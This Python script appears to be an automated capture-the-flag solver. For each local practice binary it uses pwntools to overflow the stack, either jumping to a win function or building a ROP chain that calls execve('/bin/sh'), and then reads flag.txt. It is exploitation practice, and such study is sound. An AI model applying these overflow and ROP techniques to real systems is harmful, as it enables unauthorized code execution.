import os, sys
from pwn import *
from fart import *
from time import sleep
logging.getLogger('pwnlib').setLevel(logging.WARNING)

def main():
    path = 'bins3/'
    for binary in os.listdir(path):
        binary = path + binary 
        print(binary+":")
        
        f_anal = analyze(binary)
        f_rop = our_rop(f_anal)

        if f_anal.has_win():
            ret2win(f_anal)
        elif f_anal.has_execve():
            ret2execve(f_anal)

def ret2win(f_anal):
    binary = f_anal.binary
    get_buf = get2overflow(binary)
    buf = b'A' * get_buf.buf()
    win = p64(f_anal.get_win())

    io = process(binary)
    io.sendline(buf + win)

    sleep(0.1)
    io.sendline(b'cat flag.txt')
    io.recvuntil(b'flag')
    print("flag" + io.recvuntil(b'}').decode('utf-8'))

def ret2execve(f_anal):
    binary = f_anal.binary
    get_buf = get2overflow(binary)
    get_rop = our_rop(f_anal)

    e = ELF(binary)
    r = ROP(e)

    buf = b'A' * get_buf.buf()
    chain = b''

    # populate arg1 - rdi
    chain += get_rop.fill_reg('rdi', f_anal.get_binsh())

    # populate arg2 - rsi
    chain += get_rop.fill_reg('rsi', 0)

    # populate arg3 - rdx
    chain += get_rop.fill_reg('rdx', 0)

    chain += p64(e.sym['execve'])
    
    io = process(binary)
    io.sendline(buf + chain)

    sleep(0.1)
    io.sendline(b'cat flag.txt')
    io.recvuntil(b'flag')
    print("flag" + io.recvuntil(b'}').decode('utf-8'))



main()
